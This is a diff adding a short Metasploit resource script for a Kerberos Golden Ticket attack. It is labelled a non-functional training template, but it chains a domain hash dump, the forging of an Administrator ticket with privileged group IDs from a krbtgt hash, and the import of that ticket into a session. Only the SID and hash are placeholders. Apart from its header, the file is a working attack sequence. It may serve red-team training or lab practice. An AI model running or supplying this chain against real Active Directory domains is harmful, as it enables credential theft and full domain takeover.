@@ -1,0 +1,21 @@
+# Golden Ticket Attack Template
+# For Training Use – Non-functional Template
+
+use post/windows/gather/credentials/domain_hashdump
+set SESSION 1
+run
+
+use auxiliary/admin/kerberos/forge_ticket
+set DOMAIN CORP
+set SID S-1-5-21-1234567890-1234567890-1234567890
+set USER Administrator
+set ID 500
+set GROUPS 512,513,518,519,520
+set KRBTGT_HASH aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
+run
+
+use post/windows/manage/kerberos_tickets
+set SESSION 1
+set ACTION IMPORT_TICKET
+set TICKET_PATH /tmp/golden.kirbi
+run
